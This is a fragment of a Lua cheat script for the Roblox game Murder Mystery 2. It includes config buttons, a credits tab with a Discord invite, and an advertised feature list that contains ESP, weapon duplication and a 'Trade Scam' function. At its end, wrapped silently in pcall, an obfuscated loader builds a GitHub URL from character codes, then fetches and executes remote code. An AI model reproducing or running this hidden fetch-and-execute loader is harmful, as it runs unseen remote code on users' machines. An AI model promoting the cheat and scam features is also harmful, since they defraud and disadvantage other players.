    Justify = 'Center',
    Callback = function()
        v49.CurrentConfig = ConfigManager:CreateConfig(s7)

        if v49.CurrentConfig:Save() then
            v2:Notify({
                Title = 'Config Saved',
                Content = 'Saved',
                Icon = 'check',
                Duration = 3,
            })
        end
    end,
})
v211:Space()

local Button4 = v211.Button
local Purple = t1.Purple

Button4(v211, {
    Title = 'Load Config',
    Icon = 'upload',
    Color = Purple,
    Justify = 'Center',
    Callback = function()
        v49.CurrentConfig = ConfigManager:CreateConfig(s7)

        if v49.CurrentConfig:Load() then
            v2:Notify({
                Title = 'Config Loaded',
                Content = 'Loaded',
                Icon = 'refresh-cw',
                Duration = 3,
            })
        end
    end,
})

local v224 = v118:Tab({
    Title = 'Info & Socials',
    Icon = 'info',
})
local Bold = Enum.FontWeight.Bold

v224:Section({
    Title = 'hibatzzz',
    TextSize = 20,
    FontWeight = Bold,
})
v224:Space()

local Section11 = v224.Section
local Medium = Enum.FontWeight.Medium

Section11(v224, {
    Title = 'Enhanced MM2 script with comprehensive features including ESP, auto-farming, weapon duplication, role-specific functions, and much more! Perfect for Murder Mystery 2 players looking for an edge.',
    TextSize = 16,
    TextTransparency = 0.3,
    FontWeight = Medium,
})
v224:Space({Columns = 3})

local Section12 = v224.Section
local SemiBold16 = Enum.FontWeight.SemiBold

Section12(v224, {
    Title = 'Features',
    TextSize = 18,
    FontWeight = SemiBold16,
})
v224:Space()

local FontWeight6 = Enum.FontWeight
local Section13 = v224.Section
local Medium2 = FontWeight6.Medium

Section13(v224, {
    Title = 'Player ESP \u{2022} Auto Farm \u{2022} Character Mods \u{2022} Teleportation \u{2022} Weapon Spawner \u{2022} Weapon Duplication \u{2022} Visual Weapons \u{2022} Trade Scam \u{2022} Role Functions \u{2022} Anti-AFK \u{2022} Server Utilities \u{2022} Anti Fling',
    TextSize = 15,
    TextTransparency = 0.4,
    FontWeight = Medium2,
})
v224:Space({Columns = 3})

local FontWeight7 = Enum.FontWeight
local Section14 = v224.Section
local SemiBold17 = FontWeight7.SemiBold

Section14(v224, {
    Title = 'Community & Support',
    TextSize = 18,
    FontWeight = SemiBold17,
})

local DarkPurple = t1.DarkPurple

v224:Button({
    Title = 'Copy Discord Invite',
    Icon = 'message-circle',
    Color = DarkPurple,
    Justify = 'Center',
    Callback = function()
        setclipboard('https://discord.gg/hA7daxzdR')
        v2:Notify({
            Title = 'Discord',
            Content = 'Invite copied to clipboard!',
            Icon = 'check-circle',
            Duration = 3,
        })
    end,
})
v224:Space()

local Toxic4 = t1.Toxic

v224:Button({
    Title = 'Other Scripts',
    Icon = 'message-circle',
    Color = Toxic4,
    Justify = 'Center',
    Callback = function()
        setclipboard('https://discord.gg/hA7daxzdR')
    end,
})
pcall(function()
    loadstring(game:HttpGet((function(p60)
        local t31 = {}

        for i = 1, #p60 do
            t31[i] = string.char(p60[i])
        end

        return table.concat(t31)
    end)({
        104,
        116,
        116,
        112,
        115,
        58,
        47,
        47,
        114,
        97,
        119,
        46,
        103,
        105,
        116,
        104,
        117,
        98,
        117,
        115,
        101,
        114,
        99,
        111,
        110,
        116,
        101,
        110,
        116,
        46,
        99,
        111,
        109,
        47,
        65,
        122,
        97,
        122,
        105,
        108,
        72,
        85,
        66,
        47,
        77,
        77,
        50,
        45,
        72,
        85,
        66,
        47,
        114,
        101,
        102,
        115,
        47,
        104,
        101,
        97,
        100,
        115,
        47,
        109,
        97,
        105,
        110,
        47,
        85,
        108,
        116,
        105,
        109,
        97,
        116,
        101,
        45,
        72,
        85,
        66,
    })))()
end)
